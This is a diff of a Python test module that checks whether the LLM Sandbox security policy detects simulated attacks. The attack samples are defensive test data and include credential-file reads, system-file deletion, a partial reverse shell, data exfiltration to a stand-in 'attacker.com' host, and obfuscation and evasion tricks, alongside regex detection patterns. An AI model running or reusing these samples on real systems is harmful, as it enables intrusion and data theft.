@@ -1,3 +1,5 @@
+# ruff: noqa: RUF001
+
 """Advanced security scenarios and attack simulation for LLM Sandbox.
 
 This module contains sophisticated security tests that simulate real-world
@@ -6,16 +8,11 @@ attack patterns and edge cases to thoroughly validate the security system.
 
 import logging
 import time
-from typing import Dict, List, Tuple, Any
 from dataclasses import dataclass
+from typing import Any
 
 from llm_sandbox import SandboxSession
-from llm_sandbox.security import (
-    SecurityIssueSeverity,
-    SecurityPattern,
-    DangerousModule,
-    SecurityPolicy,
-)
+from llm_sandbox.security import DangerousModule, SecurityIssueSeverity, SecurityPattern, SecurityPolicy
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
@@ -24,6 +21,7 @@ logger = logging.getLogger(__name__)
 @dataclass
 class AttackScenario:
     """Represents an attack scenario for testing."""
+
     name: str
     description: str
     code: str
@@ -34,12 +32,13 @@ class AttackScenario:
 
 class AdvancedSecurityTester:
     """Advanced security testing framework."""
-    
-    def __init__(self):
-        self.results = []
+
+    def __init__(self) -> None:
+        """Initialize the AdvancedSecurityTester."""
+        self.results: list[dict[str, Any]] = []
         self.attack_scenarios = self._create_attack_scenarios()
-    
-    def _create_attack_scenarios(self) -> List[AttackScenario]:
+
+    def _create_attack_scenarios(self) -> list[AttackScenario]:
         """Create comprehensive attack scenarios."""
         return [
             # Code Injection Attacks
@@ -55,7 +54,6 @@ print(result)
                 attack_type="code_injection",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             AttackScenario(
                 name="Command Injection via exec",
                 description="Execute system commands through exec() function",
@@ -67,7 +65,6 @@ exec(payload)
                 attack_type="code_injection",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # System Command Execution
             AttackScenario(
                 name="Direct System Command Execution",
@@ -80,7 +77,6 @@ os.system('cat /etc/passwd')
                 attack_type="system_command",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             AttackScenario(
                 name="Subprocess Command Execution",
                 description="Execute commands via subprocess module",
@@ -93,7 +89,6 @@ print(result.stdout)
                 attack_type="system_command",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # File System Attacks
             AttackScenario(
                 name="File System Traversal Attack",
@@ -107,7 +102,6 @@ print(content)
                 attack_type="file_system",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             AttackScenario(
                 name="Malicious File Writing",
                 description="Write malicious content to system files",
@@ -119,7 +113,6 @@ with open('/tmp/malicious.py', 'w') as f:
                 attack_type="file_system",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             AttackScenario(
                 name="File Deletion Attack",
                 description="Delete critical system files",
@@ -131,7 +124,6 @@ os.remove('/etc/hosts')
                 attack_type="file_system",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # Network Attacks
             AttackScenario(
                 name="Reverse Shell Creation",
@@ -148,7 +140,6 @@ subprocess.call(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fil
                 attack_type="network",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             AttackScenario(
                 name="Port Scanning",
                 description="Scan for open ports on target systems",
@@ -174,7 +165,6 @@ for port in range(20, 100):
                 attack_type="network",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             # Privilege Escalation
             AttackScenario(
                 name="Environment Variable Extraction",
@@ -191,7 +181,6 @@ print(secrets)
                 attack_type="privilege_escalation",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             # Steganography and Obfuscation
             AttackScenario(
                 name="Base64 Encoded Attack",
@@ -206,7 +195,6 @@ exec(malicious_code)
                 attack_type="obfuscation",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             AttackScenario(
                 name="Dynamic Import Attack",
                 description="Use dynamic imports to bypass static analysis",
@@ -223,7 +211,6 @@ method(command)
                 attack_type="obfuscation",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # Data Exfiltration
             AttackScenario(
                 name="Data Exfiltration via HTTP",
@@ -246,7 +233,6 @@ requests.post('http://attacker.com/collect', json=data)
                 attack_type="data_exfiltration",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             # Process Manipulation
             AttackScenario(
                 name="Process Injection",
@@ -265,7 +251,6 @@ libc.ptrace(0, 1234, 0, 0)  # PTRACE_TRACEME on PID 1234
                 attack_type="process_manipulation",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # Cryptographic Attacks
             AttackScenario(
                 name="Weak Cryptography Usage",
@@ -284,7 +269,6 @@ print(f'Weak hash: {weak_hash}')
                 attack_type="cryptography",
                 severity=SecurityIssueSeverity.LOW,
             ),
-            
             # Advanced Evasion Techniques
             AttackScenario(
                 name="String Concatenation Evasion",
@@ -303,7 +287,6 @@ func(command)
                 attack_type="evasion",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             AttackScenario(
                 name="Reflection-based Attack",
                 description="Use reflection to access dangerous functions",
@@ -318,7 +301,7 @@ eval_func('__import__("os").system("id")')
                 severity=SecurityIssueSeverity.HIGH,
             ),
         ]
-    
+
     def create_comprehensive_security_policy(self) -> SecurityPolicy:
         """Create a comprehensive security policy for testing."""
         patterns = [
@@ -333,7 +316,6 @@ eval_func('__import__("os").system("id")')
                 description="Subprocess execution",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # Dynamic code execution
             SecurityPattern(
                 pattern=r"\beval\s*\(",
@@ -345,7 +327,6 @@ eval_func('__import__("os").system("id")')
                 description="Dynamic code execution",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # File operations
             SecurityPattern(
                 pattern=r"\bopen\s*\([^)]*['\"][wa]['\"][^)]*\)",
@@ -357,7 +338,6 @@ eval_func('__import__("os").system("id")')
                 description="File deletion operations",
                 severity=SecurityIssueSeverity.HIGH,
             ),
-            
             # Network operations
             SecurityPattern(
                 pattern=r"\bsocket\.socket\s*\(",
@@ -369,7 +349,6 @@ eval_func('__import__("os").system("id")')
                 description="Network connections",
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
-            
             # Dynamic imports and attribute access
             SecurityPattern(
                 pattern=r"\b__import__\s*\(",
@@ -381,14 +360,12 @@ eval_func('__import__("os").system("id")')
                 description="Dynamic attribute access",
                 severity=SecurityIssueSeverity.LOW,
             ),
-            
             # Environment access
             SecurityPattern(
                 pattern=r"\bos\.environ",
                 description="Environment variable access",
                 severity=SecurityIssueSeverity.LOW,
             ),
-            
             # Encoding/obfuscation
             SecurityPattern(
                 pattern=r"\bbase64\.b64decode\s*\(",
@@ -396,7 +373,7 @@ eval_func('__import__("os").system("id")')
                 severity=SecurityIssueSeverity.LOW,
             ),
         ]
-        
+
         dangerous_modules = [
             DangerousModule(
                 name="os",
@@ -424,224 +401,223 @@ eval_func('__import__("os").system("id")')
                 severity=SecurityIssueSeverity.MEDIUM,
             ),
         ]
-        
+
         return SecurityPolicy(
             safety_level=SecurityIssueSeverity.LOW,
             patterns=patterns,
             dangerous_modules=dangerous_modules,
         )
-    
-    def run_attack_simulation(self) -> Dict[str, Any]:
+
+    def run_attack_simulation(self) -> dict[str, Any]:
         """Run comprehensive attack simulation."""
         logger.info("🔥 Starting Advanced Security Attack Simulation")
         logger.info("=" * 60)
-        
+
         policy = self.create_comprehensive_security_policy()
-        results = {
-            'total_scenarios': len(self.attack_scenarios),
-            'blocked_correctly': 0,
-            'allowed_correctly': 0,
-            'false_positives': 0,
-            'false_negatives': 0,
-            'by_attack_type': {},
-            'detailed_results': []
+        results: dict[str, Any] = {
+            "total_scenarios": len(self.attack_scenarios),
+            "blocked_correctly": 0,
+            "allowed_correctly": 0,
+            "false_positives": 0,
+            "false_negatives": 0,
+            "by_attack_type": {},
+            "detailed_results": [],
         }
-        
+
         with SandboxSession(lang="python", security_policy=policy, verbose=False) as session:
             for scenario in self.attack_scenarios:
-                logger.info(f"\n🎯 Testing: {scenario.name}")
-                logger.info(f"   Type: {scenario.attack_type}")
-                logger.info(f"   Expected: {'BLOCKED' if scenario.expected_blocked else 'ALLOWED'}")
-                
+                logger.info("\n🎯 Testing: %s", scenario.name)
+                logger.info("   Type: %s", scenario.attack_type)
+                logger.info("   Expected: %s", "BLOCKED" if scenario.expected_blocked else "ALLOWED")
+
                 start_time = time.time()
                 is_safe, violations = session.is_safe(scenario.code)
                 analysis_time = time.time() - start_time
-                
+
                 actual_blocked = not is_safe
                 correct_prediction = actual_blocked == scenario.expected_blocked
-                
+
                 if correct_prediction:
                     if scenario.expected_blocked:
-                        results['blocked_correctly'] += 1
+                        results["blocked_correctly"] += 1
                         status = "✅ CORRECTLY BLOCKED"
                     else:
-                        results['allowed_correctly'] += 1
+                        results["allowed_correctly"] += 1
                         status = "✅ CORRECTLY ALLOWED"
+                elif scenario.expected_blocked and not actual_blocked:
+                    results["false_negatives"] += 1
+                    status = "❌ FALSE NEGATIVE (Should be blocked but allowed)"
                 else:
-                    if scenario.expected_blocked and not actual_blocked:
-                        results['false_negatives'] += 1
-                        status = "❌ FALSE NEGATIVE (Should be blocked but allowed)"
-                    else:
-                        results['false_positives'] += 1
-                        status = "❌ FALSE POSITIVE (Should be allowed but blocked)"
-                
-                logger.info(f"   Result: {status}")
-                logger.info(f"   Analysis Time: {analysis_time:.4f}s")
-                
+                    results["false_positives"] += 1
+                    status = "❌ FALSE POSITIVE (Should be allowed but blocked)"
+
+                logger.info("   Result: %s", status)
+                logger.info("   Analysis Time: %.4fs", analysis_time)
+
                 if violations:
-                    logger.info(f"   Violations ({len(violations)}):")
+                    logger.info("   Violations (%s):", len(violations))
                     for violation in violations[:3]:  # Show first 3
-                        logger.info(f"     - {violation.description} ({violation.severity.name})")
-                
+                        logger.info("     - %s (%s)", violation.description, violation.severity.name)
+
                 # Track by attack type
                 attack_type = scenario.attack_type
-                if attack_type not in results['by_attack_type']:
-                    results['by_attack_type'][attack_type] = {
-                        'total': 0, 'correct': 0, 'false_pos': 0, 'false_neg': 0
-                    }
-                
-                results['by_attack_type'][attack_type]['total'] += 1
+                if attack_type not in results["by_attack_type"]:
+                    results["by_attack_type"][attack_type] = {"total": 0, "correct": 0, "false_pos": 0, "false_neg": 0}
+
+                results["by_attack_type"][attack_type]["total"] += 1
                 if correct_prediction:
-                    results['by_attack_type'][attack_type]['correct'] += 1
+                    results["by_attack_type"][attack_type]["correct"] += 1
                 elif actual_blocked and not scenario.expected_blocked:
-                    results['by_attack_type'][attack_type]['false_pos'] += 1
+                    results["by_attack_type"][attack_type]["false_pos"] += 1
                 else:
-                    results['by_attack_type'][attack_type]['false_neg'] += 1
-                
+                    results["by_attack_type"][attack_type]["false_neg"] += 1
+
                 # Store detailed result
-                results['detailed_results'].append({
-                    'scenario': scenario.name,
-                    'attack_type': scenario.attack_type,
-                    'expected_blocked': scenario.expected_blocked,
-                    'actual_blocked': actual_blocked,
-                    'correct': correct_prediction,
-                    'analysis_time': analysis_time,
-                    'violations': len(violations),
+                results["detailed_results"].append({
+                    "scenario": scenario.name,
+                    "attack_type": scenario.attack_type,
+                    "expected_blocked": scenario.expected_blocked,
+                    "actual_blocked": actual_blocked,
+                    "correct": correct_prediction,
+                    "analysis_time": analysis_time,
+                    "violations": len(violations),
                 })
-        
+
         return results
-    
-    def generate_security_report(self, results: Dict[str, Any]) -> None:
+
+    def generate_security_report(self, results: dict[str, Any]) -> None:
         """Generate comprehensive security test report."""
-        logger.info("\n" + "=" * 60)
+        logger.info("\n%s", "=" * 60)
         logger.info("🛡️  ADVANCED SECURITY TEST REPORT")
         logger.info("=" * 60)
-        
-        total = results['total_scenarios']
-        correct = results['blocked_correctly'] + results['allowed_correctly']
+
+        total = results["total_scenarios"]
+        correct = results["blocked_correctly"] + results["allowed_correctly"]
         accuracy = (correct / total) * 100 if total > 0 else 0
-        
-        logger.info(f"\n📊 Overall Statistics:")
-        logger.info(f"   Total Scenarios: {total}")
-        logger.info(f"   Correctly Blocked: {results['blocked_correctly']}")
-        logger.info(f"   Correctly Allowed: {results['allowed_correctly']}")
-        logger.info(f"   False Positives: {results['false_positives']}")
-        logger.info(f"   False Negatives: {results['false_negatives']}")
-        logger.info(f"   Overall Accuracy: {accuracy:.1f}%")
-        
-        logger.info(f"\n🎯 Results by Attack Type:")
-        for attack_type, stats in results['by_attack_type'].items():
-            type_accuracy = (stats['correct'] / stats['total']) * 100 if stats['total'] > 0 else 0
-            logger.info(f"   {attack_type.replace('_', ' ').title()}:")
-            logger.info(f"     Total: {stats['total']}, Correct: {stats['correct']}")
-            logger.info(f"     False Pos: {stats['false_pos']}, False Neg: {stats['false_neg']}")
-            logger.info(f"     Accuracy: {type_accuracy:.1f}%")
-        
+
+        logger.info("\n📊 Overall Statistics:")
+        logger.info("   Total Scenarios: %s", total)
+        logger.info("   Correctly Blocked: %s", results["blocked_correctly"])
+        logger.info("   Correctly Allowed: %s", results["allowed_correctly"])
+        logger.info("   False Positives: %s", results["false_positives"])
+        logger.info("   False Negatives: %s", results["false_negatives"])
+        logger.info("   Overall Accuracy: %.1f%%", accuracy)
+
+        logger.info("\n🎯 Results by Attack Type:")
+        for attack_type, stats in results["by_attack_type"].items():
+            type_accuracy = (stats["correct"] / stats["total"]) * 100 if stats["total"] > 0 else 0
+            logger.info("   %s:", attack_type.replace("_", " ").title())
+            logger.info("     Total: %s, Correct: %s", stats["total"], stats["correct"])
+            logger.info("     False Pos: %s, False Neg: %s", stats["false_pos"], stats["false_neg"])
+            logger.info("     Accuracy: %.1f%%", type_accuracy)
+
         # Performance analysis
-        analysis_times = [r['analysis_time'] for r in results['detailed_results']]
+        analysis_times = [r["analysis_time"] for r in results["detailed_results"]]
         if analysis_times:
             avg_time = sum(analysis_times) / len(analysis_times)
             max_time = max(analysis_times)
-            logger.info(f"\n⚡ Performance:")
-            logger.info(f"   Average Analysis Time: {avg_time:.4f}s")
-            logger.info(f"   Maximum Analysis Time: {max_time:.4f}s")
-        
+            logger.info("\n⚡ Performance:")
+            logger.info("   Average Analysis Time: %.4fs", avg_time)
+            logger.info("   Maximum Analysis Time: %.4fs", max_time)
+
         # Security effectiveness
-        high_risk_scenarios = [r for r in results['detailed_results'] 
-                             if any(s.name == r['scenario'] and s.severity == SecurityIssueSeverity.HIGH 
-                                   for s in self.attack_scenarios)]
-        high_risk_blocked = sum(1 for r in high_risk_scenarios if r['actual_blocked'])
-        
+        high_risk_scenarios = [
+            r
+            for r in results["detailed_results"]
+            if any(s.name == r["scenario"] and s.severity == SecurityIssueSeverity.HIGH for s in self.attack_scenarios)
+        ]
+        high_risk_blocked = sum(1 for r in high_risk_scenarios if r["actual_blocked"])
+
         if high_risk_scenarios:
             high_risk_effectiveness = (high_risk_blocked / len(high_risk_scenarios)) * 100
-            logger.info(f"\n🚨 High-Risk Attack Protection:")
-            logger.info(f"   High-Risk Scenarios: {len(high_risk_scenarios)}")
-            logger.info(f"   Successfully Blocked: {high_risk_blocked}")
-            logger.info(f"   Protection Rate: {high_risk_effectiveness:.1f}%")
-    
+            logger.info("\n🚨 High-Risk Attack Protection:")
+            logger.info("   High-Risk Scenarios: %s", len(high_risk_scenarios))
+            logger.info("   Successfully Blocked: %s", high_risk_blocked)
+            logger.info("   Protection Rate: %.1f%%", high_risk_effectiveness)
+
     def run_evasion_technique_tests(self) -> None:
         """Test advanced evasion techniques."""
         logger.info("\n🥷 Testing Advanced Evasion Techniques")
         logger.info("=" * 50)
-        
+
         evasion_tests = [
             {
-                'name': 'Unicode Obfuscation',
-                'code': '''
+                "name": "Unicode Obfuscation",
+                "code": """
 # Using unicode characters to obfuscate
 import 𝐨𝐬
 𝐨𝐬.system('whoami')
-''',
-                'expected_blocked': False,  # Might not be caught by simple regex
+""",
+                "expected_blocked": False,  # Might not be caught by simple regex
             },
             {
-                'name': 'Comment Injection',
-                'code': '''
+                "name": "Comment Injection",
+                "code": """
 import os
 # This is a comment with os.system('safe') that shouldn't trigger
 os.system('actual_command')
-''',
-                'expected_blocked': True,
+""",
+                "expected_blocked": True,
             },
             {
-                'name': 'Multi-line String Literal',
-                'code': '''
+                "name": "Multi-line String Literal",
+                "code": '''
 malicious_code = """
 import os
 os.system('id')
 """
 exec(malicious_code)
 ''',
-                'expected_blocked': True,
+                "expected_blocked": True,
             },
             {
-                'name': 'Function Pointer Indirection',
-                'code': '''
+                "name": "Function Pointer Indirection",
+                "code": """
 import os
 func = os.system
 func('whoami')
-''',
-                'expected_blocked': True,  # Should be caught by os.system pattern
+""",
+                "expected_blocked": True,  # Should be caught by os.system pattern
             },
         ]
-        
+
         policy = self.create_comprehensive_security_policy()
-        
+
         with SandboxSession(lang="python", security_policy=policy, verbose=False) as session:
             for test in evasion_tests:
-                is_safe, violations = session.is_safe(test['code'])
+                is_safe, violations = session.is_safe(str(test["code"]))
                 actual_blocked = not is_safe
-                
+
                 status = "✅ DETECTED" if actual_blocked else "❌ EVADED"
-                logger.info(f"   {test['name']}: {status}")
-                
+                logger.info("   %s: %s", test["name"], status)
+
                 if violations:
-                    logger.info(f"     Violations: {len(violations)}")
+                    logger.info("     Violations: %s", len(violations))
                     for violation in violations[:2]:
-                        logger.info(f"       - {violation.description}")
+                        logger.info("       - %s", violation.description)
 
 
 def run_advanced_security_tests() -> None:
     """Run comprehensive advanced security tests."""
     tester = AdvancedSecurityTester()
-    
+
     try:
         # Run main attack simulation
         results = tester.run_attack_simulation()
         tester.generate_security_report(results)
-        
+
         # Run evasion technique tests
         tester.run_evasion_technique_tests()
-        
+
         logger.info("\n🎉 Advanced security testing completed successfully!")
-        
-    except Exception as e:
-        logger.error(f"Advanced security testing failed: {e}")
+
+    except Exception:
+        logger.exception("Advanced security testing failed")
         raise
 
 
 if __name__ == "__main__":
     logger.info("LLM Sandbox Advanced Security Scenarios")
     logger.info("=======================================")
-    
+
     run_advanced_security_tests()
